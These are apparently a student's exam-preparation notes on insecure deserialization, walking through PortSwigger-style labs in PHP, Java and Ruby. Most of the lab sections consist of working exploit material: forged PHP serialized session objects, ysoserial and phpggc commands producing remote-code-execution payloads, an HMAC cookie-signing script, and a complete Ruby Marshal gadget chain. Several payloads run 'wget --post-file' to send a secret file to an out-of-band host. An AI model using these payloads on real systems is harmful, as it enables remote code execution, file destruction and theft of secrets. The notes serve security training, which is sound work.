## Stage 2 + 3

### What is it?
**Serialization** is the process of converting complex data structures, such as objects and their fields, into a "flatter" format that can be sent and received as a sequential stream of bytes. Crucially, when serializing an object, its state is also persisted. In other words, the object's attributes are preserved, along with their assigned values. 
**Deserialization** is the process of restoring this byte stream to a fully functional replica of the original object, in the exact state as when it was serialized. Some languages serialize objects into binary formats, whereas others use different string formats, with varying degrees of human readability. Serialization may be referred to as *marshalling (Ruby)* or *pickling (Python)*.

Java Deserialization Scanner config
```
/Library/Java/JavaVirtualMachines/temurin-8.jdk/Contents/Home/bin/java

/Users/shixian/Documents/Hax/bscp/ysoserial-all.jar
```


### PHP
Deserialized
```
$user->name = "carlos"; 
$user->isLoggedIn = true;
```

Serialized
```
O:4:"User":2:{s:4:"name":s:6:"carlos";s:10:"isLoggedIn":b:1;}
```
The native methods for PHP serialization are `serialize()` and `unserialize()`. For PHP, search for *`unserialize()`*. 

### Java
Serialized Java objects always begin with the same bytes, which are encoded as `ac ed` in hexadecimal and `rO0` in Base64.

### Useful Resources
- ysoserial
- Java Deserialization Scanner
- If you double decode and still can't see, inspect the header bytes then go here: https://en.wikipedia.org/wiki/List_of_file_signatures. `1f 8b` = gzip.

>[!tip] How to Identify this Vulnerability?
>- Burp Scanner
>- PHP: `unserialize()`
>- Java: `redObject()` and `InputStream` and/or `java.io.Serializable`

### Identify Vulnerabilities in Exam
#### Stage 3
- Couldn't find a solution to extract morale.txt
	- [Deserialization](Deserialization.md#3.3.%20Lab%20Using%20application%20functionality%20to%20exploit%20insecure%20deserialization%20%E2%AD%95%EF%B8%8F)

**In theory, this should read the contents of the file if the function on the exam isn't `_destruct`**
```
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/secret";}
```
- `CustomTemplate.php` in Page Source / `unlink()` / `lock_file_path` / `_destruct()`
	- [Deserialization](Deserialization.md#3.4.%20Lab%20Arbitrary%20object%20injection%20in%20PHP%20%E2%AD%95%EF%B8%8F)


**Use this to get secret to burp collab** 
If CommonsCollections4 doesn't work, all the other ones.
```
java \
--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
--add-opens=java.base/java.net=ALL-UNNAMED \
--add-opens=java.base/java.util=ALL-UNNAMED \
-Djdk.xml.enableTemplatesImplDeserialization=true \
-jar ysoserial-all.jar \
CommonsCollections4 'wget https://OASTIFY.COM --post-file=/home/carlos/secret' | base64 -w 0
```
- `session` cookie = `rO0AB` = Java serialized object
	- [Deserialization](Deserialization.md#3.5.%20Lab%20Exploiting%20Java%20deserialization%20with%20Apache%20Commons%20%E2%AD%95%EF%B8%8F)

- `session cookie`= `%7B%22token` + `/cgi-bin/phpinfo.php`
	- [Deserialization](Deserialization.md#3.6.%20Lab%20Exploiting%20PHP%20deserialization%20with%20a%20pre-built%20gadget%20chain%20%E2%AD%95%EF%B8%8F)

- `GET /my-account?id={USERNAME}` > Passive scan selected message > `serialized Ruby object using Marshal`
	- [Deserialization](Deserialization.md#3.7.%20Lab%20Exploiting%20Ruby%20deserialization%20using%20a%20documented%20gadget%20chain%20%E2%AD%95%EF%B8%8F)


---
#### 3.1. Lab: Modifying serialized objects ⭕️
This lab uses a serialization-based session mechanism and is vulnerable to privilege escalation as a result. To solve the lab, edit the serialized object in the session cookie to exploit this vulnerability and gain administrative privileges. Then, delete the user `carlos`.

You can log in to your own account using the following credentials: `wiener:peter`
1. Login, highlight the session cookie and notice that it is *URL encoded* AND *base64 encoded*. Notice the **PHP serialized object** with `admin` and `b:0` which equals to `false`. Send to Repeater.
	1. ![Deserialization-20260118110951965](Deserialization-20260118110951965.png)
2. Highlight session cookie > change `b:0` to `b:1` > Apply changes > Send > notice now we see the Admin panel in the response. 
	1. ![Deserialization-20260118111209418](Deserialization-20260118111209418.png)
3. Change the path to `GET /admin` > got 200 OK > change it again to `GET /admin/delete?username=carlos` to solve.
	1. ![Deserialization-20260118111318887](Deserialization-20260118111318887.png)
>[!tip] How to Identify this Vulnerability?
>1. Session cookie that is double encoded (url + base64)
>2. Session cookie contains `admin` attribute set to `b:0` aka false

---
#### 3.2. Lab: Modifying serialized data types ⭕️
This lab uses a serialization-based session mechanism and is vulnerable to authentication bypass as a result. To solve the lab, edit the serialized object in the session cookie to access the `administrator` account. Then, delete the user `carlos`.

You can log in to your own account using the following credentials: `wiener:peter`
1. Login, highlight the session cookie and notice that it is *URL encoded* AND *base64 encoded*. Notice this is a **PHP serialized object**. Send to Repeater.
	1. ![Deserialization-20260118111637120](Deserialization-20260118111637120.png)
2. Highlight the session cookie, change username length to 13, username to administrator, and access token to integer 0. Set `GET /admin`, send and get 200 OK.
	1. Before:
	2. ![Deserialization-20260118112140703](Deserialization-20260118112140703.png)
	3. After:
	4. ![Deserialization-20260118112155845](Deserialization-20260118112155845.png)
	5. `O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}`
3. Change to `GET /admin/delete?username=carlos` to solve.
	1. ![Deserialization-20260118112401511](Deserialization-20260118112401511.png)
>[!tip] How to Identify this Vulnerability?
>1. Session cookie that is double encoded (url + base64)
>2. Session cookie contains serialized objections like ones in Step 1.1

---
#### 3.3. Lab: Using application functionality to exploit insecure deserialization ⭕️
This lab uses a serialization-based session mechanism. A certain feature invokes a dangerous method on data provided in a serialized object. To solve the lab, edit the serialized object in the session cookie and use it to delete the `morale.txt` file from Carlos's home directory.

You can log in to your own account using the following credentials: `wiener:peter`

You also have access to a backup account: `gregg:rosebud`
1. Login, notice your session cookie is double encoded (url + base64), Send to Repeater. Also, notice a Delete account button.
	1. ![Deserialization-20260118154415026](Deserialization-20260118154415026.png)
2. Highlight the session cookie and notice `avatar_link` points to an endpoint: `users/wiener/avatar`. Edit it to `/home/carlos/morale.txt` > change `s:19` to `s:23` > Apply changes. Change to `POST /my-account/delete`. Send to solve.
	1. ![Deserialization-20260118154634700](Deserialization-20260118154634700.png)
	2. ![Deserialization-20260118154948729](Deserialization-20260118154948729.png)

**Need to make sure `s:` reflects the length of the value**.
>[!tip] How to Identify this Vulnerability?
>1. Session cookie that is double encoded (url + base64)
>2. Session cookie contains attribute with an endpoint

**Couldn't find a solution to extract morale.txt**

---
#### 3.4. Lab: Arbitrary object injection in PHP ⭕️
This lab uses a serialization-based session mechanism and is vulnerable to arbitrary object injection as a result. To solve the lab, create and inject a malicious serialized object to delete the `morale.txt` file from Carlos's home directory. You will need to obtain source code access to solve this lab.
You can log in to your own account using the following credentials: `wiener:peter`
>Hint: You can sometimes read source code by appending a tilde (`~)` to a filename to retrieve an editor-generated backup file.
1. View page source to find a comment: "Refactor once /libs/CustomTemplate.php is updated".
	1. ![Deserialization-20260118155339362](Deserialization-20260118155339362.png)
2. Navigating to that endpoint will show nothing but append a `~` like `/libs/CustomTemplate.php~` will get us something. *This will invoke the `unlink()` method on the `lock_file_path` attribute, which will delete the file on this path.*
	1. ![Deserialization-20260118155604409](Deserialization-20260118155604409.png)
3. Login, inspect the session cookie on `GET /my-account?id=wiener` , Send to Repeater. Replace the serialized cookie to the following payload. Apply changes, Send, and solve.
	1. Before
```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"efxbwxqva6s9congqlir7u0x8kb4h2zo";}
```
	2. After
```
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

You'll get a 500 Internal Server Error but this will solve the lab.

>[!tip] How to Identify this Vulnerability?
>1. Comment in page source revealing a CustomTemplate.php
>2. Session cookie is double encoded

**In theory, this should read the contents of the file if the function on the exam isn't `_destruct`**
```
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/secret";}
```

---
#### 3.5. Lab: Exploiting Java deserialization with Apache Commons ⭕️
This lab uses a serialization-based session mechanism and loads the Apache Commons Collections library. Although you don't have source code access, you can still exploit this lab using pre-built gadget chains.

To solve the lab, use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the `morale.txt` file from Carlos's home directory.

You can log in to your own account using the following credentials: `wiener:peter`
1. Login, notice the session cookie is a serialized Java object denoted by it starting with `rO0AB`. Send to Repeater.
	1. ![Deserialization-20260118160900019](Deserialization-20260118160900019.png)
2. Download the ysoserial `.jar` file: https://github.com/frohoff/ysoserial/releases/tag/v0.0.6. The command you run depends on the java version you have. 
	1. Configure your ysoserial path to the `.jar` file: 
	2. ![Deserialization-20260118161254859](Deserialization-20260118161254859.png)
	3. ![Deserialization-20260118161411071](Deserialization-20260118161411071.png)
	4. Java 15 or below: `java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64`
	5. Java 16 or above:
```
java \
--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
--add-opens=java.base/java.net=ALL-UNNAMED \
--add-opens=java.base/java.util=ALL-UNNAMED \
-Djdk.xml.enableTemplatesImplDeserialization=true \
-jar ysoserial-all.jar \
CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w 0
```
![Deserialization-20260125105645581](Deserialization-20260125105645581.png)
>In the exam, will have to change `rm` to `cat` #TODO or have it send to burp collaborator.
3. Solve the lab:
	1. Copy the output of the previous step > paste it in the `session` cookie > highlight and cmd + U (URL encode key characters) > Send. You will see a 500 code but it will solve.
		1. ![Deserialization-20260125105755762](Deserialization-20260125105755762.png)
>[!tip] How to Identify this Vulnerability?
>1. Session cookie is a serialized Java object `rO0AB`


check installed java versions
```
/usr/libexec/java_home -V
```


**Use this to get secret to burp collab** 
If CommonsCollections4 doesn't work, all the other ones.
```
java \
--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
--add-opens=java.base/java.net=ALL-UNNAMED \
--add-opens=java.base/java.util=ALL-UNNAMED \
-Djdk.xml.enableTemplatesImplDeserialization=true \
-jar ysoserial-all.jar \
CommonsCollections4 'wget https://OASTIFY.COM --post-file=/home/carlos/secret' | base64 -w 0
```

---
#### 3.6. Lab: Exploiting PHP deserialization with a pre-built gadget chain ⭕️
This lab has a serialization-based session mechanism that uses a signed cookie. It also uses a common PHP framework. Although you don't have source code access, you can still exploit this lab's insecure deserialization using pre-built gadget chains.

To solve the lab, identify the target framework then use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, work out how to generate a valid signed cookie containing your malicious object. Finally, pass this into the website to delete the `morale.txt` file from Carlos's home directory.

You can log in to your own account using the following credentials: `wiener:peter`
1. Login and highlight the session cookie and it is URL encoded. Notice the base64 encoded piece within `token` so copy that, paste it in Repeater somewhere and send to Decoder. Signed with a SHA-1 HMAC hash.
	1. ![Deserialization-20260125110514671](Deserialization-20260125110514671.png)
2. The base64 encoded piece revealed to be a PHP object (`O:4`)
	1. ![533](Deserialization-20260125111250124.png)
	2. Change `wiener` to `carlos`. Encode as Base64. Copy that > Repeater > highlight the session cookie > replace this new base64 encoded value in Inspector > Apply changes.
		1. ![Deserialization-20260125111430072](Deserialization-20260125111430072.png)
3. Got an error and notice the app is running *Symfony Version: 4.3.6*.
	1. ![Deserialization-20260125111508803](Deserialization-20260125111508803.png)
4. Find the `phpinfo.php` file path in the response OR quickly find it with Target > right click on domain > Engagement tools > Find comments
	1. ![262](Deserialization-20260125111817240.png)
	2. Navigate to `/cgi-bin/phpinfo.php` and search for `SECRET`. Found it. `wiqzemfqkn0b6eyylfdl5km7cclfb8x4` 
	3. ![Deserialization-20260125114334589](Deserialization-20260125114334589.png)
5. Get the `phpgcc` tool:
```
git clone https://github.com/ambionics/phpggc.git
brew install php
cd phpggc/
./phpggc -l | grep Symfony
```
7. We want the RCE4 one because it supports the version of Symfony we found.
	1. ![Deserialization-20260125112757082](Deserialization-20260125112757082.png)
8. Generate our serialized object that removes `morale.txt`:
	1. Enter `./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w 0`
		1. ![Deserialization-20260125112954884](Deserialization-20260125112954884.png)
9. Construct the cookie that contains the object above + sign it:
	1. Use Sublime
```
<?php $object = "OBJECT-GENERATED-BY-PHPGGC"; $secretKey = "LEAKED-SECRET-KEY-FROM-PHPINFO.PHP"; $cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}'); echo $cookie;
```
--
1. Replace `OBJECT-GENERATED-BY-PHPGGC` and `LEAKED-SECRET-KEY-FROM-PHPINFO.PHP`.
	1. ![Deserialization-20260125114357132](Deserialization-20260125114357132.png)
	2. `chmod +x {php-file}`
	3. `php phpgcc_payload.php`
		1. ![Deserialization-20260125113714282](Deserialization-20260125113714282.png)
2. Copy the output > replace `session` cookie > Send > solve. *IMPORTANT: remove the last `%`*.
	1. ![Deserialization-20260125114650934](Deserialization-20260125114650934.png)
>If your lab restarted, you have to redo the steps to solve.

>[!tip] How to Identify this Vulnerability?
>1. Session cookie is a serialized object `%7B%22token%22%3A%22...`
>2. Session cookie signed with a SHA-1 HMAC hash
>3. PHP object after URL + Base64 decode
>4. Symfony version 4.3.6
>5. `phpinfo.php` exists


**Could try this for the exam**
```
#try this
./phpggc Symfony/RCE4 exec 'wget https://OASTIFY.COM --post-file=/home/carlos/morale.txt' | base64 -w 0

# it worked but the data is encrypted, no way to decrypt it.
```
![Pasted image 20260220134959](Pasted%20image%2020260220134959.png)

---
#### 3.7. Lab: Exploiting Ruby deserialization using a documented gadget chain ⭕️
This lab uses a serialization-based session mechanism and the Ruby on Rails framework. There are documented exploits that enable remote code execution via a gadget chain in this framework.

To solve the lab, find a documented exploit and adapt it to create a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the `morale.txt` file from Carlos's home directory.

You can log in to your own account using the following credentials: wiener:peter
1. Login and notice that the session cookie contains a *serialized marshaled ruby object*. Target > select domain > `/my-account` endpoint > right click > Passive scan selected message > got a hit for *Serialized object in HTTP message*. 
	1. ![Deserialization-20260125181724842](Deserialization-20260125181724842.png)
	2. ![Deserialization-20260125181753504](Deserialization-20260125181753504.png)
> #ExamTip Might be able to use passive scan to identify Java + PHP serialized objects too maybe.
2. Google `ruby deserialization gadget chain` and click on the devcraft.io link. Grab the payload near the bottom, paste it in sublime and modify it like this:
```
require 'base64'
# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")


n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
puts payload.inspect
puts Base64.encode64(payload)
```
3. Run it with `ruby ruby_marshaled_deserialization.rb` 
	1. ![Deserialization-20260125184330217](Deserialization-20260125184330217.png)
4. Run the following command to remove line breaks.
```
echo "BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06
OlJlcXVpcmVtZW50WwZvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgY6CEBp
b286FE5ldDo6QnVmZmVyZWRJTwc7B286I0dlbTo6UGFja2FnZTo6VGFyUmVh
ZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEGOgZFVDoSQGRl
YnVnX291dHB1dG86Fk5ldDo6V3JpdGVBZGFwdGVyBzoMQHNvY2tldG86FEdl
bTo6UmVxdWVzdFNldAc6CkBzZXRzbzsOBzsPbQtLZXJuZWw6D0BtZXRob2Rf
aWQ6C3N5c3RlbToNQGdpdF9zZXRJIh9ybSAvaG9tZS9jYXJsb3MvbW9yYWxl
LnR4dAY7DFQ7EjoMcmVzb2x2ZQ==" | tr -d "\n\r"
```
5. Paste the output in the `session` cookie and Send to solve. Will get a 500 code but will solve. If it doesn't work, try URL encoding key characters or all characters.
	1. ![Deserialization-20260125184612851](Deserialization-20260125184612851.png)
```
BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06OlJlcXVpcmVtZW50WwZvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgY6CEBpb286FE5ldDo6QnVmZmVyZWRJTwc7B286I0dlbTo6UGFja2FnZTo6VGFyUmVhZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEGOgZFVDoSQGRlYnVnX291dHB1dG86Fk5ldDo6V3JpdGVBZGFwdGVyBzoMQHNvY2tldG86FEdlbTo6UmVxdWVzdFNldAc6CkBzZXRzbzsOBzsPbQtLZXJuZWw6D0BtZXRob2RfaWQ6C3N5c3RlbToNQGdpdF9zZXRJIh9ybSAvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dAY7DFQ7EjoMcmVzb2x2ZQ==
```
>[!tip] How to Identify this Vulnerability?
>1. Session cookie is a serialized marshaled ruby object (use passive scan to find)

**In the exam**
Replace OASTIFY.COM. In the lab it came back as an encrypted content but hopefully in the exam, it won't be.
```
require 'base64'
# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "wget https://OASTIFY.COM --post-file=/home/carlos/secret")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")


n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
puts payload.inspect
puts Base64.encode64(payload)
```